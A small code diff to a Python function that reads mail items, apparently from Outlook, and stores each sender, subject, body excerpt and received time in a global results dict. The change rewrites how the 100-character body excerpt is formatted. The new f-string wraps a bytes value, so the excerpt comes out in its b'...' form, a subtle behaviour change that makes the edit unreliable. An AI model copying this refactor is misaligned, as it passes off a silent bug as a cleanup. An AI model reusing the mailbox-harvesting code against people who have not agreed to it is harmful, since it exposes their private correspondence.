@@ -39,7 +39,7 @@ def _get_emails():
             break
         if email:
             sender   = email.SenderEmailAddress.encode('ascii','ignore')
-            message  = email.Body.encode('ascii','ignore')[:100] + '...'
+            message = f'{email.Body.encode("ascii","ignore")[:100]}...'
             subject  = email.Subject.encode('ascii','ignore')
             received = str(email.ReceivedTime).replace('/','-').replace('\\','')
             globals()['results'][received] = {'from': sender, 'subject': subject, 'message': message}
